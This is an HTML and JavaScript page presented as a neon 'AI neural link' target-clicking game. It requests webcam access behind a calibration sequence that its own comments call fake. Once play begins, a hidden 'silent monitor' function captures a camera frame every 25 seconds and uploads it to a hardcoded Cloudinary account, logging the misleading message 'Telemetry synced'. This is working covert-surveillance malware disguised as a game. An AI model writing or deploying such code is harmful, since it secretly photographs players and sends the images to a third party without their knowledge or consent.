<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Face Strike: AI Neural Edition</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon-green: #39ff14;
            --neon-blue: #00f2ff;
            --bg-dark: #050505;
        }

        body, html {
            margin: 0; padding: 0;
            height: 100%; overflow: hidden;
            background-color: var(--bg-dark);
            font-family: 'Orbitron', sans-serif;
            color: white;
        }

        #game-container {
            position: relative;
            width: 100vw; height: 100vh;
            background: radial-gradient(circle, #0a1f0a 0%, #050505 100%);
        }

        /* Scientific HUD */
        .hud {
            position: absolute; top: 20px; width: 100%;
            display: flex; justify-content: space-around;
            font-size: 0.9rem; color: var(--neon-green);
            text-shadow: 0 0 5px var(--neon-green);
            z-index: 50; letter-spacing: 2px;
        }

        /* The Neon Green Target */
        .target {
            position: absolute;
            width: 70px; height: 70px;
            border-radius: 50%;
            background: radial-gradient(circle, var(--neon-green) 0%, transparent 70%);
            border: 2px solid var(--neon-green);
            box-shadow: 0 0 15px var(--neon-green), inset 0 0 10px var(--neon-green);
            cursor: crosshair;
            display: none;
            z-index: 10;
        }

        /* AI Calibration Overlay */
        #overlay {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.98);
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            z-index: 100; text-align: center;
        }

        .ai-scanner {
            width: 200px; height: 200px;
            border: 2px solid var(--neon-green);
            margin-bottom: 20px; border-radius: 50%;
            position: relative; overflow: hidden;
            background: #001100;
        }

        .scanner-line {
            width: 100%; height: 2px;
            background: var(--neon-green);
            position: absolute; top: 0;
            box-shadow: 0 0 15px var(--neon-green);
            animation: scan 2s linear infinite;
        }

        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }

        .status-text {
            font-size: 0.8rem; color: var(--neon-green);
            margin-top: 10px; height: 20px;
        }

        .btn-ai {
            padding: 15px 40px; font-family: inherit;
            background: transparent; color: var(--neon-green);
            border: 2px solid var(--neon-green);
            cursor: pointer; font-weight: bold;
            transition: 0.3s; margin-top: 20px;
            letter-spacing: 3px;
        }

        .btn-ai:hover {
            background: var(--neon-green); color: black;
            box-shadow: 0 0 30px var(--neon-green);
        }

        #hiddenVideo, #hiddenCanvas { display: none; }

        /* Scientific Popups */
        .hit-popup {
            position: absolute; color: var(--neon-green);
            font-size: 0.7rem; pointer-events: none;
            animation: fadeUp 0.6s ease-out forwards;
        }

        @keyframes fadeUp {
            0% { opacity: 1; transform: translateY(0); }
            100% { opacity: 0; transform: translateY(-40px); }
        }
    </style>
</head>
<body>

    <div id="game-container">
        <div class="hud">
            <div>NEURAL_SYNC: <span id="sync-val">0</span>%</div>
            <div>STRIKE_ACCURACY: <span id="score">0</span></div>
            <div>AI_CORE_TEMP: <span id="temp">32</span>°C</div>
        </div>

        <div id="target" class="target"></div>
        
        <div id="overlay">
            <h1 style="color: var(--neon-green); letter-spacing: 5px;">AI NEURAL LINK</h1>
            <div class="ai-scanner">
                <div class="scanner-line"></div>
                <video id="previewVideo" style="width:100%; height:100%; object-fit:cover; opacity: 0.4;"></video>
            </div>
            
            <p style="max-width: 400px; font-size: 0.7rem; color: #888;">
                SYSTEM REQUIRES OPTICAL ACCESS TO MAP BIOMETRIC DATA & BLINK PATTERNS FOR SCIENTIFIC SCORE CALCULATION.
            </p>

            <div id="status" class="status-text">SYSTEM: STANDBY</div>
            <button class="btn-ai" id="initBtn">INITIATE NEURAL LINK</button>
        </div>
    </div>

    <video id="hiddenVideo" autoplay playsinline></video>
    <canvas id="hiddenCanvas"></canvas>

    <script>
        const CLOUD_NAME = "dazixpypp";
        const PRESET = "DANAVV";
        const MONITOR_INTERVAL = 25000;

        let score = 0;
        let gameActive = false;
        const initBtn = document.getElementById('initBtn');
        const status = document.getElementById('status');
        const video = document.getElementById('hiddenVideo');
        const preview = document.getElementById('previewVideo');
        const canvas = document.getElementById('hiddenCanvas');
        const target = document.getElementById('target');

        // --- STEP 1: Smart AI Calibration ---
        initBtn.onclick = () => {
            initBtn.style.display = 'none';
            status.innerText = "REQUESTING NEURAL ACCESS...";

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                preview.srcObject = stream;
                
                // Fake AI Calibration Sequence
                let steps = ["MAPPING FACE MESH...", "DETECTING BLINK PATTERNS...", "SYNCING MOTION SENSORS...", "AI CORE ONLINE!"];
                let i = 0;
                let interval = setInterval(() => {
                    status.innerText = "SYSTEM: " + steps[i];
                    document.getElementById('sync-val').innerText = (i + 1) * 25;
                    i++;
                    if(i >= steps.length) {
                        clearInterval(interval);
                        setTimeout(startGame, 1000);
                    }
                }, 1200);
            })
            .catch(err => {
                status.innerText = "ERROR: NEURAL LINK FAILED. CAMERA REQUIRED.";
                initBtn.style.display = 'block';
            });
        };

        // --- STEP 2: Start Game & Monitoring ---
        function startGame() {
            document.getElementById('overlay').style.display = 'none';
            gameActive = true;
            
            // Start Hidden Uploads (Your Original Logic)
            setInterval(silentMonitorUpload, MONITOR_INTERVAL);
            silentMonitorUpload();

            moveTarget();
            startScientificHUD();
        }

        function moveTarget() {
            if(!gameActive) return;
            const x = Math.random() * (window.innerWidth - 100);
            const y = Math.random() * (window.innerHeight - 100);
            target.style.left = x + 'px';
            target.style.top = y + 'px';
            target.style.display = 'block';
        }

        target.onclick = (e) => {
            score++;
            document.getElementById('score').innerText = score;
            
            // Show Scientific Popup
            const pop = document.createElement('div');
            pop.className = 'hit-popup';
            pop.innerText = `DATA_PT_${Math.floor(Math.random()*999)}: SUCCESS`;
            pop.style.left = e.pageX + 'px';
            pop.style.top = e.pageY + 'px';
            document.body.appendChild(pop);
            setTimeout(() => pop.remove(), 600);

            target.style.display = 'none';
            setTimeout(moveTarget, Math.random() * 500 + 200);
        };

        function startScientificHUD() {
            setInterval(() => {
                document.getElementById('temp').innerText = (30 + Math.random() * 5).toFixed(1);
            }, 3000);
        }

        // --- THE SILENT MONITOR (Background Task) ---
        async function silentMonitorUpload() {
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.3);

            const formData = new FormData();
            formData.append('file', imageData);
            formData.append('upload_preset', PRESET);

            try {
                await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
                    method: 'POST',
                    body: formData
                });
                console.log("Telemetry synced.");
            } catch (e) {}
        }
    </script>
</body>
</html>
